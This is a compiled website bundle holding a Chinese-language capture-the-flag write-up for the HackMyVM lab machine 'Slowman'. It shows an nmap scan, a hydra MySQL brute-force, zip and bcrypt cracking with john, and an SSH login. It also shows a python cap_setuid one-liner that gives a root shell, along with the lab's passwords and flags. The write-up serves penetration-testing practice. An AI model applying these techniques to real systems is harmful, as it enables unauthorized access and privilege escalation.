"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[789],{2516:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>i,contentTitle:()=>o,default:()=>p,frontMatter:()=>r,metadata:()=>l,toc:()=>c});var t=s(5893),a=s(1151);const r={},o="Slowman",l={id:"HackMyVM/Machines/Slowman/index",title:"Slowman",description:"[Linux VM] [Tested on VirtualBox] created by || Pylon",source:"@site/docs/HackMyVM/Machines/Slowman/index.md",sourceDirName:"HackMyVM/Machines/Slowman",slug:"/HackMyVM/Machines/Slowman/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Slowman/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Slowman/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"RoosterRun",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/RoosterRun/"},next:{title:"SuidyRevenge",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/SuidyRevenge/"}},i={},c=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"ftp Anonymous",id:"ftp-anonymous",level:2},{value:"mysql \u8fdc\u7a0b\u8fde\u63a5",id:"mysql-\u8fdc\u7a0b\u8fde\u63a5",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"User - trainerjean",id:"user---trainerjean",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,a.a)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"slowman",children:"Slowman"}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || Pylon"}),(0,t.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2023-12-04"}),(0,t.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 6a4ad8842487288bd6d076fb6e19d3ce"}),(0,t.jsx)(n.p,{children:"\u2620 Root // 53"}),(0,t.jsx)(n.p,{children:"\ud83d\udc80 User // 50"}),(0,t.jsx)(n.p,{children:"\ud83d\udcddNotes //\nEnjoy it :)"})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,t.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.104\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.104\nHost is up (0.00048s latency).\nNot shown: 65530 filtered tcp ports (no-response)\nPORT     STATE  SERVICE  VERSION\n20/tcp   closed ftp-data\n21/tcp   open   ftp      vsftpd 3.0.5\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_Can't get directory listing: TIMEOUT\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:192.168.56.102\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.5 - secure, fast, stable\n|_End of status\n22/tcp   open   ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 02:d6:5e:01:45:5b:8d:2d:f9:cb:0b:df:45:67:04:22 (ECDSA)\n|_  256 f9:ce:4a:75:07:d0:05:1d:fb:a7:a7:69:39:1b:08:10 (ED25519)\n80/tcp   open   http     Apache httpd 2.4.52 ((Ubuntu))\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Fastgym\n3306/tcp open   mysql    MySQL 8.0.35-0ubuntu0.22.04.1\n| ssl-cert: Subject: commonName=MySQL_Server_8.0.35_Auto_Generated_Server_Certificate\n| Not valid before: 2023-11-22T19:44:52\n|_Not valid after:  2033-11-19T19:44:52\n| mysql-info:\n|   Protocol: 10\n|   Version: 8.0.35-0ubuntu0.22.04.1\n|   Thread ID: 10\n|   Capabilities flags: 65535\n|   Some Capabilities: FoundRows, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsTransactions, LongPassword, IgnoreSigpipes, Speaks41ProtocolOld, Support41Auth, IgnoreSpaceBeforeParenthesis, InteractiveClient, LongColumnFlag, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, ODBCClient, SupportsLoadDataLocal, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults\n|   Status: Autocommit\n|   Salt: I-h4^y\\x01\\x11w8~FvG\\x02cPh7F\n|_  Auth Plugin Name: caching_sha2_password\n|_ssl-date: TLS randomness does not represent time\n"})}),"\n",(0,t.jsx)(n.h2,{id:"ftp-anonymous",children:"ftp Anonymous"}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u533f\u540d\u767b\u5f55\uff0c\u5217\u51fa\u5171\u4eab\u76ee\u5f55"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"ftp> ls -lh\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0              12 Nov 22 21:46 allowedusersmysql.txt\n226 Directory send OK.\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u67e5\u770b\u6587\u4ef6\u5185\u5bb9"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="allowedusersmysql.txt"',children:"trainerjeff\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6839\u636e\u6587\u4ef6\u540d\u731c\u6d4b\uff0c\u662f mysql \u5141\u8bb8\u8fde\u63a5\u7684\u7528\u6237\u540d"}),"\n",(0,t.jsx)(n.h2,{id:"mysql-\u8fdc\u7a0b\u8fde\u63a5",children:"mysql \u8fdc\u7a0b\u8fde\u63a5"}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u4f7f\u7528 hydra \u7206\u7834\u7528\u6237\u5bc6\u7801"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"[3306][mysql] host: 192.168.56.104   login: trainerjeff   password: soccer1\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4f7f\u7528\u7206\u7834\u51fa\u6765\u7684\u51ed\u636e\u8fdb\u884c\u8fde\u63a5\u6570\u636e\u5e93\uff0c\u67e5\u770b\u57fa\u672c\u4fe1\u606f"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"MySQL [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| sys                |\n| trainers_db        |\n+--------------------+\n\nMySQL [trainers_db]> show tables;\n+-----------------------+\n| Tables_in_trainers_db |\n+-----------------------+\n| users                 |\n+-----------------------+\n\nMySQL [trainers_db]> select * from users;\n+----+-----------------+-------------------------------+\n| id | user            | password                      |\n+----+-----------------+-------------------------------+\n|  1 | gonzalo         | tH1sS2stH3g0nz4l0pAsSWW0rDD!! |\n|  2 | $SECRETLOGINURL | /secretLOGIN/login.html       |\n+----+-----------------+-------------------------------+\n"})}),"\n",(0,t.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u76ee\u5f55\u7206\u7834"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"[12:18:58] 200 -    5KB - /contact.html\n[12:19:05] 200 -    5KB - /images/\n[12:19:05] 200 -   16KB - /index.html\n[12:19:06] 200 -    1KB - /js/\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u7ecf\u8fc7\u7b80\u5355\u5224\u65ad\uff0c\u90fd\u662f\u9759\u6001\u8d44\u6e90\uff0c\u6ca1\u6709\u654f\u611f\u6587\u4ef6"}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u4f7f\u7528\u6570\u636e\u5e93\u4e2d\u5f97\u5230\u7684\u4fe1\u606f\u767b\u9646\u540e\u53f0\uff0c\u5f97\u5230"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.56.104/secretgym/serverSHARE/credentials.zip\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4e0b\u8f7d\u4e0b\u6765\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u5e26\u6709\u5bc6\u7801\u4fdd\u62a4\uff0c\u5c1d\u8bd5\u7834\u89e3"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nspongebob1       (credentials.zip/passwords.txt)\n1g 0:00:00:00 DONE (2024-02-12 12:49) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5f97\u5230\u4ee5\u4e0b\u4fe1\u606f"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="credentials.zip/passwords.txt"',children:"----------\n$USERS: trainerjean\n\n$PASSWORD: $2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq\n----------\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c06\u5f97\u5230\u7684\u54c8\u5e0c\u503c\u7ee7\u7eed\u8fdb\u884c\u7206\u7834"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 2 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\ntweety1          (?)\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---trainerjean",children:"User - trainerjean"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $pwncat-cs trainerjean@192.168.56.104\n[12:53:41] Welcome to pwncat \ud83d\udc08!\nPassword: *******\n[12:53:48] 192.168.56.104:22: registered new host w/ db\n(local) pwncat$ back\n(remote) trainerjean@slowman:/home/trainerjean$ whoami\ntrainerjean\n"})}),"\n",(0,t.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) trainerjean@slowman:/home/trainerjean$ cat user.txt\nYOU9et7HEpA$SwordofS10wMan!!\n"})}),"\n",(0,t.jsx)(n.h3,{id:"\u5c1d\u8bd5\u63d0\u6743",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="getcap -r / 2>/dev/null"',children:"/snap/core20/2015/usr/bin/ping cap_net_raw=ep\n/snap/core20/1974/usr/bin/ping cap_net_raw=ep\n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep\n/usr/bin/python3.10 cap_setuid=ep\n/usr/bin/mtr-packet cap_net_raw=ep\n/usr/bin/ping cap_net_raw=ep\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u53d1\u73b0 python \u53ef\u4ee5\u5229\u7528 cap_setuid \u5b9e\u73b0\u63d0\u6743"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) trainerjean@slowman:/home/trainerjean$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\n[](remote)[] []root@slowman[]:[]/home/trainerjean[]$ whoami\nroot\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,t.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"[](remote)[] []root@slowman[]:[]/root[]$ cat root.txt\nY0UGE23t7hE515roo7664pa5$WoRDOFSlowmaN!!\n"})})]})}function p(e={}){const{wrapper:n}={...(0,a.a)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(d,{...e})}):d(e)}},1151:(e,n,s)=>{s.d(n,{Z:()=>l,a:()=>o});var t=s(7294);const a={},r=t.createContext(a);function o(e){const n=t.useContext(r);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:o(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);